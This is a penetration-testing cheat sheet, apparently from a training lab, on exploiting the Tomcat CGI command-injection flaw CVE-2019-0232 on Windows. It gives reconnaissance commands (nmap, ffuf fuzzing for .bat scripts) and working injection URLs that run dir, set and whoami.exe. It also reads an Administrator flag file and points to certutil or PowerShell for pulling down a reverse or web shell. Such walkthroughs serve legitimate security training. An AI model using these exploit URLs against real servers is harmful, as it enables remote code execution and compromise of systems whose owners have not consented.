# Tomcat CGI
## Tomcat CGI RCE (CVE-2019-0232)
```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```
**Concept:** On Windows, arguments passed to a CGI script (batch file) are often passed directly to `cmd.exe`. Due to a logic flaw in JRE/Tomcat parameter parsing, an attacker can use the command separator `&` in the query string to inject arbitrary system commands. 
**Prerequisite:** Target must be running Tomcat on **Windows**, have the **CGI Servlet enabled**, and have **`enableCmdLineArguments="true"`** (or be an older version where this is default). 
**Impact:** Remote Code Execution (RCE) as the user running Tomcat (often `SYSTEM` or `Local Service`).
### 1. Identification (Reconnaissance)
**Goal:** Identify active CGI scripts (Batch files) exposed on the server. Common directories include `/cgi/` and `/cgi-bin/`.
#### Service Discovery
Identify Tomcat instances (often ports 8080, 8009, 8443).
```shell
nmap -sV -p 8080 10.129.204.227
```
#### CGI Script Fuzzing
Since this vulnerability targets Windows batch files, fuzz for extensions like `.bat`, `.cmd`, and `.exe`.
```shell
# Target the /cgi/ directory (Default for Tomcat)
# Wordlist: common.txt
# Extension: .bat (Most common vector)
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
- **Hit:** `welcome.bat` (Status 200).
### 2. Validation (Weaponization)
**Goal:** Confirm the vulnerability by injecting a benign shell command. 
**Technique:** Append `?&<command>` to the URL. The `&` tells `cmd.exe` to execute a second command.
#### Basic Injection Test
Inject `dir` to list directory contents.
```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
- **Success Indicator:** The response includes the volume label, serial number, and file list.
### 3. Exploitation (RCE)
**Goal:** Execute arbitrary binaries. 
**Challenge:** The CGI environment often has a restricted or empty `PATH` variable. Commands like `whoami` or `ipconfig` might fail because the system doesn't know where they are located.
#### Step 1: Enumeration (Environment Variables)
Execute `set` to dump environment variables and understand the context (paths, users, software versions).
```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
#### Step 2: Absolute Path Execution
Since the `PATH` variable is likely restricted, you must specify the **full path** to the binary you want to run.
- **Target:** `whoami` -> `c:\windows\system32\whoami.exe`
#### Step 3: URL Encoding
Characters like `\` and `:` may break the request or be misinterpreted by the browser/proxy. **Always URL encode the payload.**
- **Payload:** `&c:\windows\system32\whoami.exe`
- **Encoded:** `&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

**Final Exploit URL:**
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
### 4. Actions on Objectives
**Goal:** Escalate from single commands to full interactive access.
#### Reading Files (Type)
```http
http://10.129.204.227:8080/cgi/welcome.bat?&type%20C%3A%5CUsers%5CAdministrator%5Cflag.txt
```
#### Uploading a Shell (Certutil/Powershell)
Since you have RCE, use `certutil` or `powershell` (if available in the path) to download a reverse shell or web shell (e.g., JSP) to the webroot.
- _Note:_ You must identify the webroot path via the `&set` command output (look for `X_TOMCAT_SCRIPT_PATH`).